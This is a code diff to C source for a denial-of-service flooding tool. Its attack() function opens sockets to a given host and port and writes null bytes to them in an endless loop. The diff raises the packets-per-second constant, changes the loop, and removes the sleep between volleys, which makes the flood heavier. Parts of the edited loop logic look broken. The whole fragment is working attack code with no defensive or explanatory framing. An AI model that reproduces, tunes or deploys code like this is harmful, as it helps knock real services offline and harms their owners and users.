@@ -12,7 +12,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 int buffer = 1024;
-#define PPS 13743895347200
+#define PPS 900000000
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
@@ -60,7 +60,7 @@ void attack(char *host, char *port, int id) {
 		sockets[x]=0;
 	signal(SIGPIPE, &broke);
 	while(1) {
-		for(i=0; i < PPS; i++) {
+		for(x=0; x != PPS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 		        r=write(sockets[x], "\0", 1);
@@ -72,7 +72,7 @@ void attack(char *host, char *port, int id) {
 			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
 		fprintf(stderr, "[%i: Voly Sent]\n", id);
-		usleep(300000);
+		
 	}
 }
 
